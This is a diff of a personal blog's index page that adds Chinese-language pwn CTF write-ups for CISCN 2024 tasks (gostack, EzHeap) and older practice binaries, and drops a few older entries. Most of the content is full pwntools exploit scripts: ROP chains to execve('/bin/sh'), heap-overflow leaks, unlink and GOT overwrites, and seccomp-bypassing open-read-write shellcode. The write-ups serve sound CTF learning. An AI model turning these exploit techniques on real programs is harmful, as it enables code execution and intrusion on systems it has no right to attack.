@@ -115,6 +115,481 @@
     
     <div class="recent-post-item">
 
+      <a href="/2024/05/19/ciscn-pwn/" class="item-title">ciscn_pwn</a>
+      
+      <time datetime="2024-05-19T08:17:29.000Z">
+        2024-05-19
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- 第一天_gostack64位的静态编译题
+
+很明显的syscall和很多可以利用的gadget
+
+利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag
+from pwn import*
+from LibcSearcher import *
+p=remote(&quot;8.147.134.47&quot;,16589)
+#p=process(&quot;./gostack&quot;)
+elf=ELF(&#39;./gostack&#39;)
+context.log_level=&quot;debug&quot;
+# Gadgets and syscall addresses
+syscall_address = 0x404043
+rax_ret_address = 0x40f984
+rdi_6_ret_address = 0x4a18a5
+rsi_ret_address = 0x42138a
+rdx_ret_address = 0x4944ec
+
+# Create the payload
+payload = b&#3 -->
+        <!-- </div> -->
+
+        
+        <h2 id="第一天-gostack"><a href="#第一天-gostack" class="headerlink" title="第一天_gostack"></a>第一天_gostack</h2><h5 id="64位的静态编译题"><a href="#64位的静态编译题" class="headerlink" title="64位的静态编译题"></a>64位的静态编译题</h5><p><img src="https://s2.loli.net/2024/05/19/xeACKin2JEw7B8X.png" alt="image-20240519162316093"></p>
+<p><img src="https://s2.loli.net/2024/05/19/5HwmgvtCEARJojT.png" alt="image-20240519162532844"></p>
+<h5 id="很明显的syscall和很多可以利用的gadget"><a href="#很明显的syscall和很多可以利用的gadget" class="headerlink" title="很明显的syscall和很多可以利用的gadget"></a>很明显的syscall和很多可以利用的gadget</h5><p><img src="https://s2.loli.net/2024/05/19/lAQMKgWLYoJOx2n.png" alt="image-20240519162808628"></p>
+<p><img src="https://s2.loli.net/2024/05/19/WIfjVbrg7SMcAPh.png" alt="image-20240519162853532"></p>
+<h5 id="利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag"><a href="#利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag" class="headerlink" title="利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag"></a>利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag</h5><p><img src="https://s2.loli.net/2024/05/19/PIrL94hM2jltmno.png" alt="image-20240519163321686"></p>
+<pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+p=remote(&quot;8.147.134.47&quot;,16589)
+#p=process(&quot;./gostack&quot;)
+elf=ELF(&#39;./gostack&#39;)
+context.log_level=&quot;debug&quot;
+# Gadgets and syscall addresses
+syscall_address = 0x404043
+rax_ret_address = 0x40f984
+rdi_6_ret_address = 0x4a18a5
+rsi_ret_address = 0x42138a
+rdx_ret_address = 0x4944ec
+
+# Create the payload
+payload = b&#39;a&#39; * 0x100
+payload += p64(elf.bss()) + p64(0x10) + p64(0) * 0x18
+payload += p64(rdi_6_ret_address) + p64(0) * 6
+payload += p64(rsi_ret_address) + p64(elf.bss() + 0x200)
+payload += p64(rdx_ret_address) + p64(0x100)
+payload += p64(rax_ret_address) + p64(0)
+payload += p64(syscall_address)
+payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5
+payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5
+payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5
+payload += p64(rsi_ret_address) + p64(0)
+payload += p64(rdx_ret_address) + p64(0)
+payload += p64(rax_ret_address) + p64(0x3b)
+payload += p64(syscall_address)
+
+# Send the payload
+p.sendlineafter(&#39;message :\n&#39;, payload)
+input()
+p.sendline(&#39;/bin/sh\x00&#39;)
+p.interactive()
+</code></pre>
+<h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p><img src="https://s2.loli.net/2024/05/19/tjciLKWbQEsTOF2.png" alt="image-20240519164039631"></p>
+<h5 id="edit函数存在堆溢出"><a href="#edit函数存在堆溢出" class="headerlink" title="edit函数存在堆溢出"></a>edit函数存在堆溢出</h5><p><img src="https://s2.loli.net/2024/05/19/WyVCcLqEt6MK45J.png" alt="image-20240519164143452"></p>
+<h5 id="开启了沙箱保护-这是一道堆的orw。"><a href="#开启了沙箱保护-这是一道堆的orw。" class="headerlink" title="开启了沙箱保护,这是一道堆的orw。"></a>开启了沙箱保护,这是一道堆的orw。</h5><p><img src="https://s2.loli.net/2024/05/19/EVw45MF9RsYUeTp.png" alt="image-20240519164437835"></p>
+<h5 id="泄露出堆的基地址"><a href="#泄露出堆的基地址" class="headerlink" title="泄露出堆的基地址"></a>泄露出堆的基地址</h5><pre><code class="lang-py">add_chunk(0x28)
+add_chunk(0x28)
+
+# Edit and leak heap address
+edit_chunk(0, 0x50, b&#39;a&#39; * 0x50)
+show_chunk(0)
+io.recvuntil(b&#39;a&#39; * 0x50)
+gdb.attach(io)
+pause()
+heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\x00&#39;))
+heap_base = heap_leak &lt;&lt; 12
+</code></pre>
+<p><img src="https://s2.loli.net/2024/05/19/eM7kiyhCDB5rKgT.png" alt="image-20240519165038422"></p>
+<h5 id="将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag"><a href="#将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag" class="headerlink" title="将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag"></a>将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag</h5><pre><code class="lang-py">from pwn import *
+
+elf = ELF(&quot;./EzHeap&quot;)
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+io=process(&#39;EzHeap&#39;)
+#io = remote(&#39;8.147.129.121&#39;, 26987)
+
+def add_chunk(size, content=b&#39;&#39;):
+    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;1&#39;)
+    io.sendlineafter(&quot;size:&quot;, str(int(size)))
+    io.sendafter(&quot;content:&quot;, content)
+
+def delete_chunk(index):
+    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;2&#39;)
+    io.sendlineafter(&quot;idx:&quot;, str(index))
+
+def edit_chunk(index, size, content):
+    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;3&#39;)
+    io.sendlineafter(&quot;idx:&quot;, str(index))
+    io.sendlineafter(&quot;size:&quot;, str(size))
+    io.sendafter(&quot;content:&quot;, content)
+
+def show_chunk(index):
+    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;4&#39;)
+    io.sendlineafter(&quot;idx:&quot;, str(index))
+
+def exit_program():
+    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;5&#39;)
+
+# Add initial chunks
+add_chunk(0x28)
+add_chunk(0x28)
+
+# Edit and leak heap address
+edit_chunk(0, 0x50, b&#39;a&#39; * 0x50)
+show_chunk(0)
+io.recvuntil(b&#39;a&#39; * 0x50)
+gdb.attach(io)
+pause()
+heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\x00&#39;))
+heap_base = heap_leak &lt;&lt; 12
+
+# Edit chunk to set up fake chunk
+edit_chunk(0, 0x50, b&#39;\x00&#39; * 0x28 + p64(0x21) + b&#39;\x00&#39; * 0x18 + p64(0xd1))
+
+# Leak libc address
+edit_chunk(1, 0x30, b&#39;a&#39; * 0x30)
+show_chunk(1)
+io.recvuntil(b&#39;a&#39; * 0x30)
+libc_leak = u64(io.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
+libc_base = libc_leak - 0x21ace0
+
+# Edit chunk to consolidate chunks
+edit_chunk(1, 0x30, b&#39;\x00&#39; * 0x28 + p64(0xf1))
+
+# Set up libc addresses
+setcontext_address = libc_base + 0x539e0 + 61
+read_address = libc_base + 0x1147d0
+write_address = libc_base + 0x114870
+rtld_global_address = libc_base + 0x285040
+rtld_3_address = libc_base + 0x2865a0
+
+pop_rdi = libc_base + 0x2a3e5
+pop_rsi = libc_base + 0xe7d0d
+pop_rdx = libc_base + 0x11f2e7  # r12
+ret = libc_base + 0x1193c1
+pop_rax = libc_base + 0x45eb0
+syscall = libc_base + 0x91316
+target_address = ((heap_base + 0x1e30) &gt;&gt; 12) ^ rtld_global_address
+
+# Add chunks to manipulate heap
+add_chunk(0x78)  # Chunk 2
+add_chunk(0x78)  # Chunk 3
+add_chunk(0x78)  # Chunk 4
+add_chunk(0x78)  # Chunk 5
+edit_chunk(5, 0x100, b&#39;a&#39; * 0x78 + p64(0x21) + p64(target_address))
+add_chunk(0x18)  # Chunk 6
+add_chunk(0x18)  # Chunk 7
+add_chunk(0x18)  # Chunk 8
+add_chunk(0x18)  # Chunk 9
+add_chunk(0x18, p64(heap_base + 0x300) + p64(5) + p64(rtld_3_address))
+
+heap_leak_adjusted = heap_base - 0x650
+l_next_address = libc_base + 0x286890
+
+# Create link map
+link_map = p64(0)
+link_map += p64(l_next_address)
+link_map += p64(0)
+link_map += p64(heap_leak_adjusted + 0x940)
+link_map += p64(0) * 28
+link_map += p64(heap_leak_adjusted + 0xa50)
+link_map += p64(heap_leak_adjusted + 0xa70)
+link_map += p64(heap_leak_adjusted + 0xa60)
+link_map += p64(0x10)
+link_map += p64(setcontext_address)
+link_map += p64(ret)
+link_map += p64(0) * 13
+link_map += p64(heap_leak_adjusted + 0x200)
+link_map += b&#39;./flag&#39;.ljust(8, b&#39;\x00&#39;)
+link_map += p64(0)
+link_map += p64(0x100)
+link_map += p64(0) * 2
+link_map += p64(heap_leak_adjusted + 0xc60)
+link_map += p64(ret)
+link_map += p64(0) * 38
+link_map += p64(0x800000000)
+
+# Create ROP chain
+rop_chain = p64(ret) * 0x1
+rop_chain += p64(pop_rdi) + p64(heap_leak_adjusted + 0xaf0)
+rop_chain += p64(pop_rax) + p64(2)
+rop_chain += p64(pop_rsi) + p64(0)
+rop_chain += p64(syscall)
+
+rop_chain += p64(pop_rdi) + p64(3)
+rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800)
+rop_chain += p64(pop_rdx) + p64(0x50) + p64(0)
+rop_chain += p64(read_address)
+rop_chain += p64(pop_rdi) + p64(1)
+rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800)
+rop_chain += p64(pop_rdx) + p64(0x50) + p64(0)
+rop_chain += p64(write_address)
+
+# Edit chunk with link map and ROP chain
+edit_chunk(0, 0x400, link_map + rop_chain)
+
+# Exit and trigger the payload
+exit_program()
+
+io.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/05/19/ciscn-pwn/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2024/05/02/easyshell/" class="item-title">easyshell</a>
+      
+      <time datetime="2024-05-02T14:42:19.000Z">
+        2024-05-02
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node4.buuoj.cn&quot;,)
+p=process(&quot;./babyheap&quot;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;libc.so&#39;)
+elf=ELF(&#39;babyheap&#39;)
+
+p.recvuntil(&#39;captcha is: &#39;)
+cap=p.recv(8)
+p.sendlineafter(&#39;the captcha: &#39;,cap)
+#p.sendlineafter(
+#p.sendlineafter(&#39;Please Select: &#39;,)
+
+
+def add(index,size):
+    p.sendlineafter(&#39;Please Select: &#39;,&#39;1&#39;)
+    p.sendlineafter(&#39;Index: &#39;,str(index))
+ -->
+        <!-- </div> -->
+
+        
+        <pre><code>from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node4.buuoj.cn&quot;,)
+p=process(&quot;./babyheap&quot;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;libc.so&#39;)
+elf=ELF(&#39;babyheap&#39;)
+
+p.recvuntil(&#39;captcha is: &#39;)
+cap=p.recv(8)
+p.sendlineafter(&#39;the captcha: &#39;,cap)
+#p.sendlineafter(
+#p.sendlineafter(&#39;Please Select: &#39;,)
+
+
+def add(index,size):
+    p.sendlineafter(&#39;Please Select: &#39;,&#39;1&#39;)
+    p.sendlineafter(&#39;Index: &#39;,str(index))
+    p.sendlineafter(&#39;Size: &#39;,str(size))
+
+def fill(size,content):
+    p.sendlineafter(&#39;Please Select: &#39;,&#39;3&#39;)
+    p.sendlineafter(&#39;Size: &#39;,str(size))
+    p.sendlineafter(&#39;Content: &#39;,content)
+
+
+gdb.attach(p)
+sleep(1)
+add(20,0x60)
+
+
+p.interactive()
+</code></pre>
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/05/02/easyshell/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2024/04/27/heap/" class="item-title">heap</a>
+      
+      <time datetime="2024-04-27T13:35:10.000Z">
+        2024-04-27
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- chunk就是一整个
+
+ malloc返回的指针指向chunk的数据区域
+free返回的指针指向chunk的header
+pre_size只有在上一个chunk（物理相邻）是释放时才属于下一个chunk的区域，否则属于上一个chunk的
+free_chunk的大小 0x20~0x0x80,malloc(8)得到的是0x20的chunk
+
+ -->
+        <!-- </div> -->
+
+        
+        <p>chunk就是一整个</p>
+<p><img src="https://s2.loli.net/2024/05/14/f3vUmEAbwlS7J6j.png" alt="image-20240514230404731"></p>
+<p> malloc返回的指针指向chunk的数据区域</p>
+<p>free返回的指针指向chunk的header</p>
+<p>pre_size只有在上一个chunk（物理相邻）是释放时才属于下一个chunk的区域，否则属于上一个chunk的</p>
+<p>free_chunk的大小 0x20~0x0x80,malloc(8)得到的是0x20的chunk</p>
+<p><img src="https://s2.loli.net/2024/05/14/Y7PbWRAnHrodXKG.png" alt="image-20240514230437610"></p>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/04/27/heap/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2024/04/26/note2/" class="item-title">note2</a>
+      
+      <time datetime="2024-04-26T11:00:38.000Z">
+        2024-04-26
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!--  没开偏移的保护
+size是无符号数
+
+进函数后变有符号数，会有溢出
+
+
+
+
+这里只能用字节来填充，b’\x00’都不行
+改了free_got才free的，会执行one_gadget
+用system打会报错，不行
+因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停
+expfrom pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node5.buuoj.cn&quot;,27431)
+p=process(&quot;./note2&quot;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;./libc-2.23.so&#39;)
+elf=ELF(&#39;./note2&#39;)
+p.sendlineafter(&#39; name:&#39;,&#39;sdf&#39;)
+p.sendlineafter(&#39;address:&#39;,&#39;asdf -->
+        <!-- </div> -->
+
+        
+        <p> 没开偏移的保护</p>
+<p>size是无符号数</p>
+<p><img src="https://s2.loli.net/2024/04/28/tRUaW5Y9BfsNqeI.png" alt="image-20240426213934832"></p>
+<p>进函数后变有符号数，会有溢出</p>
+<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426214016393.png" alt="image-20240426214016393"></p>
+<p><img src="https://s2.loli.net/2024/04/28/Cj3ytfD9z2euRWx.png" alt="image-20240426190337391"></p>
+<p><img src="https://s2.loli.net/2024/04/28/2mSIchNlVYxzaHZ.png" alt="image-20240426190621665"></p>
+<p><img src="https://s2.loli.net/2024/04/28/qxcdEysoNJZnevh.png" alt="image-20240426190918191"></p>
+<h5 id="这里只能用字节来填充，b’-x00’都不行"><a href="#这里只能用字节来填充，b’-x00’都不行" class="headerlink" title="这里只能用字节来填充，b’\x00’都不行"></a>这里只能用字节来填充，b’\x00’都不行</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426211910916.png" alt="image-20240426211910916"></p>
+<h5 id="改了free-got才free的，会执行one-gadget"><a href="#改了free-got才free的，会执行one-gadget" class="headerlink" title="改了free_got才free的，会执行one_gadget"></a>改了free_got才free的，会执行one_gadget</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426213312570.png" alt="image-20240426213312570"></p>
+<h5 id="用system打会报错，不行"><a href="#用system打会报错，不行" class="headerlink" title="用system打会报错，不行"></a>用system打会报错，不行</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426215822432.png" alt="image-20240426215822432"></p>
+<h5 id="因为这里有个strncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-函数，遇到‘-0’或空字符截停"><a href="#因为这里有个strncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-函数，遇到‘-0’或空字符截停" class="headerlink" title="因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停"></a>因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停</h5><p><img src="https://s2.loli.net/2024/04/28/c2k16O4aoGXNPDB.png" alt="image-20240426213647135"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node5.buuoj.cn&quot;,27431)
+p=process(&quot;./note2&quot;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;./libc-2.23.so&#39;)
+elf=ELF(&#39;./note2&#39;)
+p.sendlineafter(&#39; name:&#39;,&#39;sdf&#39;)
+p.sendlineafter(&#39;address:&#39;,&#39;asdf&#39;)
+
+def add(size,content):
+    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)
+    p.sendlineafter(&#39;(less than 128)&#39;,str(size))
+    p.sendlineafter(&#39; content:&#39;,content)
+
+def show(index):
+    p.recvuntil(&quot;&gt;&gt;&quot;)
+    p.sendline(&quot;2&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(index))
+
+def edit(index, choice, content):
+    p.recvuntil(&quot;&gt;&gt;&quot;)
+    p.sendline(&quot;3&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(index))
+    p.recvuntil(&quot;]&quot;)
+    p.sendline(str(choice))
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(content)
+
+def free(index):
+    p.recvuntil(&quot;&gt;&gt;&quot;)
+    p.sendline(&quot;4&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(index))
+&#39;&#39;&#39;
+io.recvuntil(&quot;:&quot;)
+io.sendline(&quot;/bin/sh&quot;) #name
+io.recvuntil(&quot;:&quot;)
+io.sendline(&quot;ddd&quot;)
+&#39;&#39;&#39;
+ptr=0x602120
+fd=ptr-0x18
+bk=ptr-0x10
+
+payload=b&#39;\x00&#39;*8+p64(0xa1)+p64(fd)+p64(bk)
+add(0x80,payload)     #0
+add(0,&#39;sadf&#39;)         #1
+add(0x80,&#39;bin/sh&#39;)    #2
+free(1)
+
+payload=p64(0)*2+p64(0xa0)+p64(0x90)
+add(0,payload)
+
+free(2)
+#b&#39;a&#39;*0x18
+free_got=elf.got[&#39;free&#39;]
+payload=b&#39;a&#39;*0x18+p64(free_got)
+edit(0,1,payload)
+gdb.attach(p)
+sleep(1)
+show(0)
+p.recvuntil(&#39;is &#39;)
+addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+base=addr-libc.sym[&#39;free&#39;]
+system=base+libc.sym[&#39;system&#39;]
+one=base+0xf02a4
+edit(0,1,p64(system))
+print(hex(addr))
+
+#p.sendline(payload)
+
+p.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/04/26/note2/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
       <a href="/2024/04/11/ciscn-final-5/" class="item-title">ciscn_final_5</a>
       
       <time datetime="2024-04-11T11:36:41.000Z">
@@ -144,360 +619,6 @@
 
         <span>
           <a class="article-read" href="/2024/04/11/ciscn-final-5/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/03/23/GUESS/" class="item-title">GUESS</a>
-      
-      <time datetime="2024-03-23T10:34:29.000Z">
-        2024-03-23
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 开了canary
-
-在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数
-把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移本地一直打不通，调试也有问题expfrom pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node5.buuoj.cn&quot;,26222)
-p=process(&quot;./GUESS&quot;)
-context.log_level=&quot;debug&quot;
-elf=ELF(&#39;./GUESS&#39;)
-puts_got=elf.got[&#39;puts&#39;]
-libc=ELF(&#39;./libc-2.23.so&#39;)
-payload=b&#39;a&#39;*0x128+p64(puts_ -->
-        <!-- </div> -->
-
-        
-        <p>开了canary</p>
-<p><img src="https://i0.imgs.ovh/2024/03/22/gkJhl.png" alt="image-20240323183540854"></p>
-<h5 id="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数"><a href="#在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数" class="headerlink" title="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数"></a>在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数</h5><p><img src="https://i0.imgs.ovh/2024/03/22/gsrOt.png" alt="image-20240323211819577"></p>
-<h5 id="把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"><a href="#把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移" class="headerlink" title="把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"></a>把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移</h5><h5 id="本地一直打不通，调试也有问题"><a href="#本地一直打不通，调试也有问题" class="headerlink" title="本地一直打不通，调试也有问题"></a>本地一直打不通，调试也有问题</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node5.buuoj.cn&quot;,26222)
-p=process(&quot;./GUESS&quot;)
-context.log_level=&quot;debug&quot;
-elf=ELF(&#39;./GUESS&#39;)
-puts_got=elf.got[&#39;puts&#39;]
-libc=ELF(&#39;./libc-2.23.so&#39;)
-payload=b&#39;a&#39;*0x128+p64(puts_got)
-p.recvuntil(&#39; guessing flag&#39;)
-
-p.sendline(payload)
-p.recvuntil(&#39;detected ***: &#39;)
-puts_addr=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))
-print(hex(puts_addr))
-base=puts_addr-libc.sym[&#39;puts&#39;]
-environ=base+libc.sym[&#39;__environ&#39;]
-payload=b&#39;a&#39;*0x128+p64(environ)
-gdb.attach(p)
-p.recvuntil(&#39; guessing flag&#39;)
-p.sendline(payload)
-
-p.recvuntil(&#39;detected ***: &#39;)
-envi=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))
-print(hex(envi))
-flag=envi-0x168
-payload=b&#39;a&#39;*0x128+p64(flag)
-p.recvuntil(&#39; guessing flag&#39;)
-p.sendline(payload)
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/03/23/GUESS/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/03/22/bad/" class="item-title">bad</a>
-      
-      <time datetime="2024-03-22T06:08:42.000Z">
-        2024-03-22
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 
-
-
-很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用seccomp_init(0LL);是初始化seccomp_init函数0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用
-所以这道题只能用orw的方式获取flagmmap=0x123000
-orw_payload=shellcraft.open(&#39;./flag&#39;) #打开根目录下的flag文件，文件标识符为3
-orw_payload+=shellcraft.read(3,mmap,0x50) #读取文件标识符为3的文件的0x50个字节到地址mmap
-orw_payload+=shellcraft.write(1,mmap,0x50) #将mmap的地址的值输出
-
-不把orw_payload写到栈上因为其很大
-所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上
-jmp_rsp_ret -->
-        <!-- </div> -->
-
-        
-        <p><img src="https://i0.imgs.ovh/2024/03/21/eN68l.png" alt="image-20240322140930289"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/21/eNkFd.png" alt="image-20240322141022925"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/21/eN0sK.png" alt="image-20240322141035709"></p>
-<h5 id="很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"><a href="#很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用" class="headerlink" title="很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"></a>很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用</h5><h5 id="seccomp-init-0LL-是初始化seccomp-init函数"><a href="#seccomp-init-0LL-是初始化seccomp-init函数" class="headerlink" title="seccomp_init(0LL);是初始化seccomp_init函数"></a><strong><em>seccomp_init(0LL);</em></strong>是初始化seccomp_init函数</h5><h5 id="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"><a href="#0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用" class="headerlink" title="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"></a><strong><em>0，1，2，60</em></strong>，分别是允许进程可读，可写，可执行，和退出的系统调用</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eNBi2.png" alt="image-20240322141910159"></p>
-<h5 id="所以这道题只能用orw的方式获取flag"><a href="#所以这道题只能用orw的方式获取flag" class="headerlink" title="所以这道题只能用orw的方式获取flag"></a>所以这道题只能用orw的方式获取flag</h5><pre><code class="lang-py">mmap=0x123000
-orw_payload=shellcraft.open(&#39;./flag&#39;) #打开根目录下的flag文件，文件标识符为3
-orw_payload+=shellcraft.read(3,mmap,0x50) #读取文件标识符为3的文件的0x50个字节到地址mmap
-orw_payload+=shellcraft.write(1,mmap,0x50) #将mmap的地址的值输出
-</code></pre>
-<h5 id="不把orw-payload写到栈上因为其很大"><a href="#不把orw-payload写到栈上因为其很大" class="headerlink" title="不把orw_payload写到栈上因为其很大"></a>不把orw_payload写到栈上因为其很大</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eaafo.png" alt="image-20240322151355993"></p>
-<h5 id="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"><a href="#所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上" class="headerlink" title="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"></a>所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上</h5><p><img src="https://i0.imgs.ovh/2024/03/21/ea9JH.png" alt="image-20240322151126619"></p>
-<pre><code class="lang-py">jmp_rsp_ret=asm(&#39;sub rsp,0x30;jmp rsp&#39;)
-get_shell=asm(&#39;mov rax,0x123000;call rax&#39;)
-payload=asm(shellcraft.read(0,mmap,0x100))+get_shell
-payload=payload.ljust(0x28,b&#39;\x00&#39;)
-payload+=p64(jmp_rsp)+jmp_rsp_ret#
-</code></pre>
